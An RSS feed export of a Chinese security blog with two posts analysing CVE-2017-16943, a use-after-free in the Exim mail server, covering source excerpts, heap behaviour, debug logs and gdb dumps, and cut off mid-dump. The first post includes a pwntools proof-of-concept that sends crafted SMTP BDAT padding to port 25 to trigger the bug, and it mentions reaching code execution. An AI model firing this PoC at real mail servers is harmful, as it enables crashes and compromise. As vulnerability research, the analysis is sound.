<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hc1m1</title>
    <link>http://0x48.pw/</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
    <pubDate>Wed, 13 Dec 2017 07:48:51 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>CVE-2017-16943 Exim UAF漏洞分析--后续</title>
      <link>http://0x48.pw/2017/12/08/0x3F/</link>
      <guid>http://0x48.pw/2017/12/08/0x3F/</guid>
      <pubDate>Fri, 08 Dec 2017 06:15:55 GMT</pubDate>
      <description>
      
        &lt;p&gt;&lt;a href=&quot;https://paper.seebug.org/469/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇分析&lt;/a&gt;出来后，经过@orange的提点，得知了meh公布的PoC是需要特殊配置才能触发，所以我上一篇分析文章最后的结论应该改成，在默认配置情况下，meh提供的PoC无法成功触发uaf漏洞。之后我又对为啥修改了配置后能触发和默认情况下如何触发漏洞进行了研究&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p><a href="https://paper.seebug.org/469/" target="_blank" rel="external">上一篇分析</a>出来后，经过@orange的提点，得知了meh公布的PoC是需要特殊配置才能触发，所以我上一篇分析文章最后的结论应该改成，在默认配置情况下，meh提供的PoC无法成功触发uaf漏洞。之后我又对为啥修改了配置后能触发和默认情况下如何触发漏洞进行了研究</p>
<a id="more"></a>
<h1 id="重新复现漏洞"><a href="#重新复现漏洞" class="headerlink" title="重新复现漏洞"></a>重新复现漏洞</h1><p>比上一篇分析中复现的步骤，只需要多一步，注释了<code>/usr/exim/configure</code>文件中的<code>control = dkim_disable_verify</code></p>
<p>然后调整下poc的padding，就可以成功触发UAF漏洞，控制rip</p>
<h2 id="分析特殊配置下的触发流程"><a href="#分析特殊配置下的触发流程" class="headerlink" title="分析特殊配置下的触发流程"></a>分析特殊配置下的触发流程</h2><p>在代码中有一个变量是<code>dkim_disable_verify</code>, 在设置后会变成<code>true</code>，所以注释掉的情况下，就为默认值<code>false</code>, 然后再看看<code>receive.c</code>中的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL</span></div><div class="line"><span class="title">receive_msg</span><span class="params">(BOOL extract_recip)</span></div><div class="line">&#123;</div><div class="line">......</div><div class="line"><span class="number">1733</span>：<span class="keyword">if</span> (smtp_input &amp;&amp; !smtp_batched_input &amp;&amp; !dkim_disable_verify)</div><div class="line"><span class="number">1734</span>：  dkim_exim_verify_init(chunking_state &lt;= CHUNKING_OFFERED);</div><div class="line"><span class="number">1735</span>：<span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
<p>进入了<code>dkim_exim_verify_init</code>函数，之后的大致流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dkim_exim_verify_init -&gt; pdkim_init_verify -&gt; ctx-&gt;linebuf = store_get(PDKIM_MAX_BODY_LINE_LEN);</div><div class="line"></div><div class="line">bdat_getc -&gt; smtp_getc -&gt; smtp_refill -&gt; dkim_exim_verify_feed -&gt; pdkim_feed -&gt; string_catn -&gt; string_get -&gt; store_get(0x64)</div><div class="line"></div><div class="line">#define PDKIM_MAX_BODY_LINE_LEN     16384       //0x4000</div></pre></td></tr></table></figure>
<p>在上一篇文章中说过了，无法成功触发uaf漏洞的原因是，被free的堆处于堆顶，释放后就和top chunk合并了。</p>
<p>在注释了dkim的配置后，在<code>dkim_exim_verify_init</code> 函数的流程中，执行了一个<code>store_get</code> 函数，申请了一个0x4000大小的堆，然后在<code>dkim_exim_verify_init</code> 函数和<code>dkim_exim_verify_feed</code> 函数中，都有如下的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">store_pool = POOL_PERM;</div><div class="line">......</div><div class="line">store_pool = dkim_verify_oldpool;</div><div class="line">---------------</div><div class="line">enum &#123; POOL_MAIN, POOL_PERM, POOL_SEARCH &#125;;</div></pre></td></tr></table></figure>
<p><code>store_pool</code>全局变量被修改为了1，之前说过了，exim自己实现了一套堆管理，当<code>store_pool</code>不同时，相当于对堆进行了隔离，不会影响<code>receive_msg</code> 函数中使用堆管理时的<code>current_block</code>这类的堆管理全局变量</p>
<p>当dkim相关的代码执行结束后，还把<code>store_pool</code>恢复回去了</p>
<p>因为申请了一个0x4000大小的堆，大于0x2000，所以申请之后<code>yield_length</code>全局变量的值变为了0，导致了之后<code>store_get(0x64)</code>再次申请了一块堆，所以有了两块堆放在了heap1的上面，释放heap1后，heap1被放入了unsortbin，成功触发了uaf漏洞，造成crash。(之前的文章中都有写到)</p>
<h2 id="默认配置情况下复现漏洞"><a href="#默认配置情况下复现漏洞" class="headerlink" title="默认配置情况下复现漏洞"></a>默认配置情况下复现漏洞</h2><p>在特殊配置情况下复现了漏洞后，又进行了如果在默认配置情况下触发漏洞的研究。</p>
<p>在@explorer大佬的教导下，发现了一种在默认情况下触发漏洞的情况。</p>
<p>其实触发的关键点，就是想办法在heap1上面再malloc一个堆，现在我们从头来开始分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">// daemon.c</div><div class="line"></div><div class="line">137 static void</div><div class="line">138 handle_smtp_call(int *listen_sockets, int listen_socket_count,</div><div class="line">139  int accept_socket, struct sockaddr *accepted)</div><div class="line">140 &#123;</div><div class="line">......</div><div class="line">348 pid = fork();</div><div class="line">352 if (pid == 0)</div><div class="line">353   &#123;</div><div class="line">......</div><div class="line">504     if ((rc = smtp_setup_msg()) &gt; 0)</div><div class="line">505       &#123;</div><div class="line">506       BOOL ok = receive_msg(FALSE);</div><div class="line">......</div></pre></td></tr></table></figure>
<p>首先，当有新连接进来的时候，fork一个子进程，然后进入上面代码中的那个分支，<code>smtp_setup_msg</code>函数是用来接收命令的函数，我们先发一堆无效的命令过去(padding)，控制<code>yield_length</code>的值小于0x100，目的上一篇文章说过了，因为命令无效，流程再一次进入了<code>smtp_setup_msg</code></p>
<p>这时候我们发送一个命令<code>BDAT 16356</code></p>
<p>然后有几个比较重要的操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">5085       if (sscanf(CS smtp_cmd_data, &quot;%u %n&quot;, &amp;chunking_datasize, &amp;n) &lt; 1)</div><div class="line">5093       chunking_data_left = chunking_datasize;</div><div class="line">5100       lwr_receive_getc = receive_getc;</div><div class="line">5101       lwr_receive_getbuf = receive_getbuf;</div><div class="line">5102       lwr_receive_ungetc = receive_ungetc;</div><div class="line">5104       receive_getc = bdat_getc;</div><div class="line">5105       receive_ungetc = bdat_ungetc;</div></pre></td></tr></table></figure>
<p>首先是把输入的16356赋值给<code>chunking_data_left</code></p>
<p>然后把<code>receive_getc</code>换成<code>bdat_getc</code>函数</p>
<p>再做完这些的操作后，进入了<code>receive_msg</code>函数，按照上篇文章的流程差不多，显示申请了一个0x100的heap1</p>
<p>然后进入<code>receive_getc=bdat_getc</code>读取数据:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">534</span> <span class="keyword">int</span></div><div class="line"><span class="number">535</span> bdat_getc(<span class="keyword">unsigned</span> lim)</div><div class="line"><span class="number">536</span> &#123;</div><div class="line">......</div><div class="line"><span class="number">546</span>   <span class="keyword">if</span> (chunking_data_left &gt; <span class="number">0</span>)</div><div class="line"><span class="number">547</span>     <span class="keyword">return</span> lwr_receive_getc(chunking_data_left--);</div></pre></td></tr></table></figure>
<p><code>lwr_receive_getc=smtp_getc</code>通过该函数获取16356个字符串</p>
<p>首先，我们发送16352个a作为padding，然后执行了下面这流程:</p>
<ul>
<li>store_extend return 0 -&gt; store_get -&gt; store_release</li>
</ul>
<p>先申请了一个0x4010的heap2，然后释放了长度为0x2010的heap1</p>
<p>然后发送<code>:\r\n</code>，进入下面的代码分支:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">1902</span>   <span class="keyword">if</span> (ch == <span class="string">'\r'</span>)</div><div class="line"><span class="number">1903</span>     &#123;</div><div class="line"><span class="number">1904</span>     ch = (receive_getc)(GETC_BUFFER_UNLIMITED);</div><div class="line"><span class="number">1905</span>     <span class="keyword">if</span> (ch == <span class="string">'\n'</span>)</div><div class="line"><span class="number">1906</span>       &#123;</div><div class="line"><span class="number">1907</span>       <span class="keyword">if</span> (first_line_ended_crlf == TRUE_UNSET) first_line_ended_crlf = TRUE;</div><div class="line"><span class="number">1908</span>       <span class="keyword">goto</span> EOL;</div><div class="line"><span class="number">1909</span>       &#125;</div></pre></td></tr></table></figure>
<p>跳到了EOL，最重要的是最后几行代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">2215</span>   header_size = <span class="number">256</span>;</div><div class="line"><span class="number">2216</span>   next = store_get(<span class="keyword">sizeof</span>(header_line));</div><div class="line"><span class="number">2217</span>   next-&gt;text = store_get(header_size);</div><div class="line"><span class="number">2218</span>   ptr = <span class="number">0</span>;</div><div class="line"><span class="number">2219</span>   had_zero = <span class="number">0</span>;</div><div class="line"><span class="number">2220</span>   prevlines_length = <span class="number">0</span>;</div><div class="line"><span class="number">2221</span>   &#125;      <span class="comment">/* Continue, starting to read the next header */</span></div></pre></td></tr></table></figure>
<p>把一些变量重新进行了初始化，因为之前因为padding执行了<code>store_get(0x4000)</code>，所以这个时候<code>yield_length=0</code> 这个时候再次调用store_get将会申请一个0x2000大小堆，从unsortbin中发现heap1大小正好合适，所以这个时候得到的就是heap1，在heap1的顶上有一个之前<code>next-&gt;text</code>使用，大小0x4010，未释放的堆。</p>
<p>之后流程的原理其实跟之前的差不多，PoC如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">r = remote(<span class="string">'localhost'</span>, <span class="number">25</span>)</div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.sendline(<span class="string">"EHLO test"</span>)</div><div class="line">r.recvuntil(<span class="string">"250 HELP"</span>)</div><div class="line">r.sendline(<span class="string">"MAIL FROM:&lt;test@localhost&gt;"</span>)</div><div class="line">r.recvline()</div><div class="line">r.sendline(<span class="string">"RCPT TO:&lt;test@localhost&gt;"</span>)</div><div class="line">r.recvline()</div><div class="line"><span class="comment"># raw_input()</span></div><div class="line">r.sendline(<span class="string">'a'</span>*<span class="number">0x1300</span>+<span class="string">'\x7f'</span>)</div><div class="line"><span class="comment"># raw_input()</span></div><div class="line">r.recvuntil(<span class="string">'command'</span>)</div><div class="line">r.sendline(<span class="string">'BDAT 16356'</span>)</div><div class="line">r.sendline(<span class="string">"a"</span>*<span class="number">16352</span>+<span class="string">':\r'</span>)</div><div class="line">r.sendline(<span class="string">'aBDAT \x7f'</span>)</div><div class="line">s = <span class="string">'a'</span>*<span class="number">6</span> + p64(<span class="number">0xabcdef</span>)*(<span class="number">0x1e00</span>/<span class="number">8</span>)</div><div class="line">r.send(s+ <span class="string">':\r\n'</span>)</div><div class="line">r.recvuntil(<span class="string">'command'</span>)</div><div class="line"><span class="comment">#raw_input()</span></div><div class="line">r.send(<span class="string">'\n'</span>)</div></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>根据该CVE作者发的文章，得知是利用文件IO的fflush来控制第一个参数，然后通过堆喷和内存枚举来来伪造vtable，最后跳转到<code>expand_string</code>函数来执行命令，正好我最近也在研究ctf中的<code>_IO_FILE</code>的相关利用(之后应该会写几篇这方面相关的blog)，然后实现了RCE，结果图如下：</p>
<p><img src="http://qn.lazysheep.cc/img/exim1.png" alt="exim1"></p>
<p><img src="http://qn.lazysheep.cc/img/exim2.png" alt="exim2"></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/" target="_blank" rel="external">https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/</a></li>
</ol>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/12/08/0x3F/#disqus_thread</comments>
    </item>
    
    <item>
      <title>CVE-2017-16943 Exim UAF漏洞分析</title>
      <link>http://0x48.pw/2017/12/01/0x3E/</link>
      <guid>http://0x48.pw/2017/12/01/0x3E/</guid>
      <pubDate>Fri, 01 Dec 2017 03:22:37 GMT</pubDate>
      <description>
      
        &lt;p&gt;感恩节那天，meh在Bugzilla上提交了一个exim的uaf漏洞：&lt;a href=&quot;https://bugs.exim.org/show_bug.cgi?id=2199&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://bugs.exim.org/show_bug.cgi?id=2199&lt;/a&gt;，这周我对该漏洞进行应急复现，却发现，貌似利用meh提供的PoC并不能成功利用UAF漏洞造成crash&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>感恩节那天，meh在Bugzilla上提交了一个exim的uaf漏洞：<a href="https://bugs.exim.org/show_bug.cgi?id=2199" target="_blank" rel="external">https://bugs.exim.org/show_bug.cgi?id=2199</a>，这周我对该漏洞进行应急复现，却发现，貌似利用meh提供的PoC并不能成功利用UAF漏洞造成crash</p>
<a id="more"></a>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先进行漏洞复现</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>复现环境：ubuntu 16.04 server</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 从github上拉取源码</span></div><div class="line">$ git <span class="built_in">clone</span> https://github.com/Exim/exim.git</div><div class="line"><span class="comment"># 在4e6ae62分支修补了UAF漏洞，所以把分支切换到之前的178ecb：</span></div><div class="line">$ git checkout ef9da2ee969c27824fcd5aed6a59ac4<span class="built_in">cd</span>217587b</div><div class="line"><span class="comment"># 安装相关依赖</span></div><div class="line">$ apt install libdb-dev libpcre3-dev</div><div class="line"><span class="comment"># 获取meh提供的Makefile文件，放到Local目录下，如果没有则创建该目录</span></div><div class="line">$ <span class="built_in">cd</span> src</div><div class="line">$ mkdir Local</div><div class="line">$ <span class="built_in">cd</span> Local</div><div class="line">$ wget <span class="string">"https://bugs.exim.org/attachment.cgi?id=1051"</span> -O Makefile</div><div class="line">$ <span class="built_in">cd</span> ..</div><div class="line"><span class="comment"># 修改Makefile文件的第134行，把用户修改为当前服务器上存在的用户，然后编译安装</span></div><div class="line">$ make &amp;&amp; make install</div></pre></td></tr></table></figure>
<p>然后再修改下配置文件<code>/etc/exim/configure</code>文件的第364行，把<br><code>accept hosts = :</code> 修改成 <code>accept hosts = *</code></p>
<h2 id="PoC测试"><a href="#PoC测试" class="headerlink" title="PoC测试"></a>PoC测试</h2><p>从<a href="https://bugs.exim.org/attachment.cgi?id=1050" target="_blank" rel="external">https://bugs.exim.org/attachment.cgi?id=1050</a>获取到meh的debug信息，得知启动参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ /usr/exim/bin/exim -bdf -d+all</div></pre></td></tr></table></figure>
<p>PoC有两个:</p>
<ol>
<li><a href="https://bugs.exim.org/attachment.cgi?id=1049" target="_blank" rel="external">https://bugs.exim.org/attachment.cgi?id=1049</a></li>
<li><a href="https://bugs.exim.org/attachment.cgi?id=1052" target="_blank" rel="external">https://bugs.exim.org/attachment.cgi?id=1052</a></li>
</ol>
<p>需要先安装下pwntools，直接用pip装就好了，两个PoC的区别其实就是padding的长度不同而已</p>
<p>然后就使用PoC进行测试，发现几个问题：</p>
<ol>
<li>我的debug信息在最后一部分和meh提供的不一样</li>
<li>虽然触发了crash，但是并不是UAF导致的crash</li>
</ol>
<p>debug信息不同点比较：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"># 我的debug信息</div><div class="line">12:15:09  8215 SMTP&gt;&gt; 500 unrecognized command</div><div class="line">12:15:09  8215 SMTP&lt;&lt; BDAT 1</div><div class="line">12:15:09  8215 chunking state 1, 1 bytes</div><div class="line">12:15:09  8215 search_tidyup called</div><div class="line">12:15:09  8215 SMTP&gt;&gt; 250 1 byte chunk received</div><div class="line">12:15:09  8215 chunking state 0</div><div class="line">12:15:09  8215 SMTP&lt;&lt; BDAT </div><div class="line">12:15:09  8215 LOG: smtp_protocol_error MAIN</div><div class="line">12:15:09  8215   SMTP protocol error in &quot;BDAT \177&quot; H=(test) [10.0.6.18] missing size for BDAT command</div><div class="line">12:15:09  8215 SMTP&gt;&gt; 501 missing size for BDAT command</div><div class="line">12:15:09  8215 host in ignore_fromline_hosts? no (option unset)</div><div class="line">12:15:09  8215 &gt;&gt;Headers received:</div><div class="line">12:15:09  8215 :</div><div class="line">...一堆不可显字符</div><div class="line">**** debug string too long - truncated ****</div><div class="line">12:15:09  8215</div><div class="line">12:15:09  8215 search_tidyup called</div><div class="line">12:15:09  8215 &gt;&gt;Headers after rewriting and local additions:</div><div class="line">12:15:09  8215 :</div><div class="line">......一堆不可显字符</div><div class="line">**** debug string too long - truncated ****</div><div class="line">12:15:09  8215</div><div class="line">12:15:09  8215 Data file name: /var/spool/exim//input//1eKcjF-00028V-5Y-D</div><div class="line">12:15:29  8215 LOG: MAIN</div><div class="line">12:15:29  8215   SMTP connection from (test) [10.0.6.18] lost while reading message data</div><div class="line">12:15:29  8215 SMTP&gt;&gt; 421 Lost incoming connection</div><div class="line">12:15:29  8215 LOG: MAIN PANIC DIE</div><div class="line">12:15:29  8215   internal error: store_reset(0x2443048) failed: pool=0      smtp_in.c  841</div><div class="line">12:15:29  8215 SMTP&gt;&gt; 421 Unexpected failure, please try later</div><div class="line">12:15:29  8215 LOG: MAIN PANIC DIE</div><div class="line">12:15:29  8215   internal error: store_reset(0x2443068) failed: pool=0      smtp_in.c  841</div><div class="line">12:15:29  8215 SMTP&gt;&gt; 421 Unexpected failure, please try later</div><div class="line">12:15:29  8215 LOG: MAIN PANIC DIE</div><div class="line">12:15:29  8215   internal error: store_reset(0x2443098) failed: pool=0      smtp_in.c  841</div><div class="line">12:15:29  8215 SMTP&gt;&gt; 421 Unexpected failure, please try later</div><div class="line">12:15:29  8215 LOG: MAIN PANIC DIE</div><div class="line">12:15:29  8215   internal error: store_reset(0x24430c8) failed: pool=0      smtp_in.c  841</div><div class="line">12:15:29  8215 SMTP&gt;&gt; 421 Unexpected failure, please try later</div><div class="line">12:15:29  8215 LOG: MAIN PANIC DIE</div><div class="line">12:15:29  8215   internal error: store_reset(0x24430f8) failed: pool=0      smtp_in.c  841</div><div class="line">12:15:29  8215 SMTP&gt;&gt; 421 Unexpected failure, please try later</div><div class="line">12:15:29  8215 LOG: MAIN PANIC DIE</div><div class="line">12:15:29  8215   internal error: store_reset(0x2443128) failed: pool=0      smtp_in.c  841</div><div class="line">12:15:29  8215 SMTP&gt;&gt; 421 Unexpected failure, please try later</div><div class="line">12:15:29  8215 LOG: MAIN PANIC DIE</div><div class="line">12:15:29  8215   internal error: store_reset(0x2443158) failed: pool=0      smtp_in.c  841</div><div class="line">12:15:29  8215 SMTP&gt;&gt; 421 Unexpected failure, please try later</div><div class="line">12:15:29  8215 LOG: MAIN PANIC DIE</div><div class="line">12:15:29  8215   internal error: store_reset(0x2443188) failed: pool=0      smtp_in.c  841</div><div class="line">12:16:20  8213 child 8215 ended: status=0x8b</div><div class="line">12:16:20  8213   signal exit, signal 11 (core dumped)</div><div class="line">12:16:20  8213 0 SMTP accept processes now running</div><div class="line">12:16:20  8213 Listening...</div><div class="line">             --------------------------------------------</div><div class="line"># meh的debug信息</div><div class="line">10:31:59 21724 SMTP&gt;&gt; 500 unrecognized command</div><div class="line">10:31:59 21724 SMTP&lt;&lt; BDAT 1</div><div class="line">10:31:59 21724 chunking state 1, 1 bytes</div><div class="line">10:31:59 21724 search_tidyup called</div><div class="line">10:31:59 21724 SMTP&gt;&gt; 250 1 byte chunk received</div><div class="line">10:31:59 21724 chunking state 0</div><div class="line">10:31:59 21724 SMTP&lt;&lt; BDAT </div><div class="line">10:31:59 21724 LOG: smtp_protocol_error MAIN</div><div class="line">10:31:59 21724   SMTP protocol error in &quot;BDAT \177&quot; H=(test) [127.0.0.1] missing size for BDAT command</div><div class="line">10:31:59 21724 SMTP&gt;&gt; 501 missing size for BDAT command</div><div class="line">10:31:59 21719 child 21724 ended: status=0x8b</div><div class="line">10:31:59 21719   signal exit, signal 11 (core dumped)</div><div class="line">10:31:59 21719 0 SMTP accept processes now running</div><div class="line">10:31:59 21719 Listening...</div></pre></td></tr></table></figure>
<p>发现的确是抛异常了，但是跟meh的debug信息在最后却不一样，然后使用gdb进行调试，发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">RAX  0xfbad240c</div><div class="line">*RBX  0x30</div><div class="line">*RCX  0xffffffffffffffd4</div><div class="line"> RDX  0x2000</div><div class="line">*RDI  0x2b</div><div class="line">*RSI  0x4b7e8e ◂— jae    0x4b7f04 /* &apos;string.c&apos; */</div><div class="line">*R8   0x0</div><div class="line">*R9   0x24</div><div class="line">*R10  0x24</div><div class="line">*R11  0x4a69e8 ◂— push   rbp</div><div class="line">*R12  0x4b7e8e ◂— jae    0x4b7f04 /* &apos;string.c&apos; */</div><div class="line">*R13  0x1a9</div><div class="line">*R14  0x24431b8 ◂— 0x0</div><div class="line">*R15  0x5e</div><div class="line">*RBP  0x2000</div><div class="line">*RSP  0x7ffd75b862c0 —▸ 0x7ffd75b862d0 ◂— 0xffffffffffffffff</div><div class="line">*RIP  0x46cf1b (store_get_3+117) ◂— cmp    qword ptr [rax + 8], rdx</div><div class="line">--------------</div><div class="line"> &gt; 0x46cf1b &lt;store_get_3+117&gt;    cmp    qword ptr [rax + 8], rdx</div><div class="line">------------</div><div class="line"> Program received signal SIGSEGV (fault address 0xfbad2414)</div></pre></td></tr></table></figure>
<p>根本就不是meh描述的利用UAF造成的crash，继续研究，发现如果把debug all的选项<code>-d+all</code>换成只显示简单的debug信息的选项<code>-dd</code>，则就不会抛异常了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ sudo ./build-Linux-x86_64/exim -bdf -dd</div><div class="line">......</div><div class="line"> 8266 Listening...</div><div class="line"> 8268 Process 8268 is handling incoming connection from [10.0.6.18]</div><div class="line"> 8266 child 8268 ended: status=0x0</div><div class="line"> 8266   normal exit, 0</div><div class="line"> 8266 0 SMTP accept processes now running</div><div class="line"> 8266 Listening...</div></pre></td></tr></table></figure>
<p>又仔细读了一遍meh在Bugzilla上的描述，看到这句，所以猜测有没有可能是因为padding大小的原因，才导致crash失败的？所以写了代码对padding进行爆破，长度从0-0x4000，爆破了一遍，并没有发现能成功造成crash的长度。</p>
<blockquote>
<p>This PoC is affected by the block layout(yield_length), so this line: <code>r.sendline(&#39;a&#39;*0x1250+&#39;\x7f&#39;)</code> should be adjusted according to the program state.</p>
</blockquote>
<p>所以可以排除是因为padding长度的原因导致PoC测试失败。</p>
<p>而且在漏洞描述页，我还发现Exim的作者也尝试对漏洞进行测试，不过同样测试失败了，还贴出了他的debug信息，和他的debug信息进行对比，和我的信息几乎一样。(并不知道exim的作者在得到meh的Makefile和log后有没有测试成功)。</p>
<p>所以，本来一次简单的漏洞应急，变为了对该漏洞的深入研究</p>
<h1 id="浅入研究"><a href="#浅入研究" class="headerlink" title="浅入研究"></a>浅入研究</h1><p>UAF全称是use after free，所以我在free之前，patch了一个printf：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># src/store.c</div><div class="line">......</div><div class="line">448 void</div><div class="line">449 store_release_3(void *block, const char *filename, int linenumber)</div><div class="line">450 &#123;</div><div class="line">......</div><div class="line">481    printf(&quot;--------free: %8p-------\n&quot;, (void *)bb);</div><div class="line">482    free(bb);</div><div class="line">483    return;</div><div class="line">484    &#125;</div></pre></td></tr></table></figure>
<p>重新编译跑一遍，发现竟然成功触发了uaf漏洞：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ /usr/exim/bin/exim -bdf -dd</div><div class="line"> 8334 Listening...</div><div class="line"> 8336 Process 8336 is handling incoming connection from [10.0.6.18]</div><div class="line">--------free: 0x1e2c1b0-------</div><div class="line"> 8334 child 8336 ended: status=0x8b</div><div class="line"> 8334   signal exit, signal 11 (core dumped)</div><div class="line"> 8334 0 SMTP accept processes now running</div><div class="line"> 8334 Listening...</div></pre></td></tr></table></figure>
<p>然后gdb调试的信息也证明成功利用uaf漏洞造成了crash：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">*RAX  0xdeadbeef</div><div class="line">*RBX  0x1e2e5d0 ◂— 0x0</div><div class="line">*RCX  0x1e29341 ◂— 0xadbeef000000000a /* &apos;\n&apos; */</div><div class="line">*RDX  0x7df</div><div class="line">*RDI  0x1e2e5d0 ◂— 0x0</div><div class="line">*RSI  0x46cedd (store_free_3+70) ◂— pop    rbx</div><div class="line">*R8   0x0</div><div class="line"> R9   0x7f054f32b700 ◂— 0x7f054f32b700</div><div 